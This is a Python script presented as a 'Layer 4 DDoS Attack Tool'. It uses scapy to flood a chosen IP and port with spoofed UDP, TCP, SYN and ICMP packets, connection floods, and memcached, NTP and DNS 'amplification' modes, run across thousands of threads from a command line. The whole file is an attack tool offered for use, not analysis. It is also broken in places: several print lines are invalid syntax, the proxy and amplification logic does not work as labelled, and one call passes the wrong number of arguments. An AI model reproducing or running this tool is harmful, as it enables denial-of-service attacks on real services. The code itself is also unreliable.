import socket
import threading
import multiprocessing
import random
import time
import sys
import os
from scapy.all import *
from scapy.layers.inet import IP, ICMP, TCP, UDP
from scapy.layers.dns import DNS, DNSQR
from colorama import Fore, Style, init

init(autoreset=True)

MAX_THREADS = 500
MAX_PROCESSES = 6

# --- Basic L4 Attacks ---
def random_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

def random_port():
    return random.randint(1024, 65535)

def udp_flood(ip, port, duration):
    timeout = time.time() + duration
    {Fore.GREEN}print("[*] Starting enhanced UDP flood...")
    while time.time() < timeout:
        try:
            spoofed_ip = random_ip()
            spoofed_port = random_port()
            payload_size = random.randint(512, 1400)
            payload = os.urandom(payload_size)

            packet = IP(src=spoofed_ip, dst=ip) / UDP(sport=spoofed_port, dport=port) / payload
            send(packet, verbose=0)
        except Exception as e:
            pass

def tcp_flood(ip, port, duration):
    timeout = time.time() + duration
    flags = ['S', 'A', 'F', 'P', 'R', 'U']
    {Fore.GREEN}print("[*] Starting enhanced TCP flood...")
    while time.time() < timeout:
        try:
            spoofed_ip = random_ip()
            sport = random_port()
            flag = random.choice(flags)
            payload = os.urandom(random.randint(512, 1024))
            packet = IP(src=spoofed_ip, dst=ip) / TCP(sport=sport, dport=port, flags=flag) / payload
            send(packet, verbose=0)
        except Exception as e:
            pass

def syn_flood(ip, port, duration):
    timeout = time.time() + duration
    {Fore.GREEN}print("[*] Starting smart SYN flood...")
    while time.time() < timeout:
        try:
            spoofed_ip = random_ip()
            sport = random_port()
            ttl = random.randint(32, 255)
            window_size = random.randint(1024, 65535)
            packet = IP(src=spoofed_ip, dst=ip, ttl=ttl, flags="DF") / \
            TCP(sport=sport, dport=port, flags="S", window=window_size, options=[('MSS', 1460)])
            send(packet, verbose=0)
        except Exception as e:
            pass

def icmp_flood(ip, duration):  # port ignored
    timeout = time.time() + duration
    {Fore.GREEN}print("[*] Starting stealth ICMP flood...")
    while time.time() < timeout:
        try:
            spoofed_ip = random_ip()
            ttl = random.randint(64, 128)
            icmp_type = random.choice([0, 3, 5, 8, 11])
            code = random.randint(0, 15)
            pkt = IP(src=spoofed_ip, dst=ip, ttl=ttl) / ICMP(type=icmp_type, code=code) / os.urandom(random.randint(64, 512))
            send(pkt, verbose=0)
        except Exception as e:
            pass

# --- PROXY-BASED ---

def cps_attack(ip, port, duration, proxies):
    timeout = time.time() + duration
    {Fore.GREEN}print("[*] Starting connection-per-second attack via proxies...")
    while time.time() < timeout:
        for proxy in proxies:
            try:
                s = socket.socket()
                s.settimeout(1)
                s.connect((ip, port))
                s.close()
            except: pass

def connection_hold(ip, port, duration, proxies):
    timeout = time.time() + duration
    {Fore.GREEN}print("[*] Starting connection hold attack via proxies...")
    while time.time() < timeout:
        for proxy in proxies:
            try:
                s = socket.socket()
                s.connect((ip, port))
                time.sleep(3)
                s.close()
            except: pass


# --- Amplification Attacks ---

def memcached_amp(ip, port, duration):
    timeout = time.time() + duration
    {Fore.GREEN}print("[*] Starting Memcached Amplification...")
    payload = b"\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
    while time.time() < timeout:
        pkt = IP(src=random_ip(), dst=ip) / UDP(sport=random.randint(1024, 65535), dport=port) / Raw(load=payload)
        send(pkt, verbose=0)

def ntp_amp(ip, port, duration):
    timeout = time.time() + duration
    {Fore.GREEN}print("[*] Starting NTP Amplification...")
    payload = b'\x17\x00\x03\x2a' + b'\x00' * 4
    while time.time() < timeout:
        pkt = IP(src=random_ip(), dst=ip) / UDP(dport=port) / Raw(load=payload)
        send(pkt, verbose=0)

def dns_amp(ip, port, duration):
    timeout = time.time() + duration
    {Fore.GREEN}print("[*] Starting DNS Amplification...")
    while time.time() < timeout:
        pkt = IP(src=random_ip(), dst=ip) / UDP(dport=port) / DNS(rd=1, qd=DNSQR(qname="google.com", qtype="ANY"))
        send(pkt, verbose=0)

# --- Minecraft Modes (placeholder) ---

def mcbot(ip, port, duration):
    {Fore.GREEN}print("[!] MCBOT attack - To be implemented.")
    time.sleep(duration)

def mcstatus(ip, port, duration):
    {Fore.GREEN}print("[!] Minecraft status ping - Placeholder.")
    time.sleep(duration)

def mcpe_status(ip, port, duration):
    {Fore.GREEN}print("[!] Minecraft PE status ping - Placeholder.")
    time.sleep(duration)

# --- PROXY LOADER ---

def load_proxies(file='proxies.txt'):
    try:
        with open(file, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

# --- HYBRID ENGINE ---

def run_threads(func, ip, port, duration, use_proxy):
    proxies = load_proxies() if use_proxy else []
    args = (ip, port, duration, proxies) if use_proxy else (ip, port, duration)
    
    threads = []
    for _ in range(MAX_THREADS):
        t = threading.Thread(target=func, args=args)
        t.daemon = True 
        t.start()
        threads.append(t)
    time.sleep(duration)

def hybrid_engine(func, ip, port, duration, use_proxy=False):
    processes = []
    process_args = (func, ip, port, duration, use_proxy)
    
    print(f"[*] Starting {MAX_PROCESSES} processes, each with {MAX_THREADS} threads.")
    for _ in range(MAX_PROCESSES):
        p = multiprocessing.Process(target=run_threads, args=process_args)
        p.start()
        processes.append(p)
    
    for p in processes:
        p.join()
    
    print("[*] Attack finished.")


# --- Main CLI Controller ---

def banner():
    print(Fore.RED + Style.BRIGHT + """
██╗██╗  ██╗    ███╗   ██╗██╗   ██╗██╗  ██╗███████╗
██║██║  ██║    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝
██║███████║    ██╔██╗ ██║██║   ██║█████╔╝ █████╗  
██║╚════██║    ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  
███████╗██║    ██║ ╚████║╚██████╔╝██║  ██╗███████╗
╚══════╝╚═╝    ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝
      
  Layer 4 DDoS Attack Tool
  Developed by: IanNarito
""" + Style.RESET_ALL)

if __name__ == "__main__":
    banner()
    
    if len(sys.argv) < 5:
        help_banner = f"""{Fore.RED}
╔════════════════════════════════════════════════════════════════════╗
║         {Fore.YELLOW}⚠  INSUFFICIENT ARGUMENTS — READ CAREFULLY ⚠{Fore.RED}               ║
╠════════════════════════════════════════════════════════════════════╣
║  {Fore.WHITE}Usage  :{Fore.CYAN} python nuke.py <mode> <ip> <port> <duration>             {Fore.RED}║
║  {Fore.WHITE}Example :{Fore.CYAN} python nuke.py tcp 1.1.1.1 80 60                        {Fore.RED}║
╠════════════════════════════════════════════════════════════════════╣
║  {Fore.WHITE}Available Modes:{Fore.GREEN}                                                  {Fore.RED}║
║    ▸ tcp      ▸ udp      ▸ syn      ▸ cps                          {Fore.RED}║
║    ▸ icmp     ▸ connection ▸ mem      ▸ ntp                        {Fore.RED}║
║    ▸ dns      ▸ mcbot    ▸ minecraft  ▸ mcpe                       {Fore.RED}║
╚════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}"""
        print(help_banner)
        sys.exit(1)
    
    mode = sys.argv[1].lower()
    ip = sys.argv[2]
    port = int(sys.argv[3])
    duration = int(sys.argv[4])
    
    mode_map = {
        "tcp": tcp_flood,
        "udp": udp_flood,
        "syn": syn_flood,
        "icmp": icmp_flood,
        "cps": lambda i, p, d, pr: cps_attack(i, p, d, pr),
        "connection": lambda i, p, d, pr: connection_hold(i, p, d, pr),
        "mem": memcached_amp,
        "ntp": ntp_amp,
        "dns": dns_amp,
        "mcbot": mcbot,
        "minecraft": mcstatus,
        "mcpe": mcpe_status,
    }

    if mode in mode_map:
        is_proxy = mode in ["cps", "connection"]
        hybrid_engine(mode_map[mode], ip, port, duration, use_proxy=is_proxy)
    else:
        print(Fore.RED + "[!] Unknown mode selected." + Style.RESET_ALL)
        sys.exit(1)
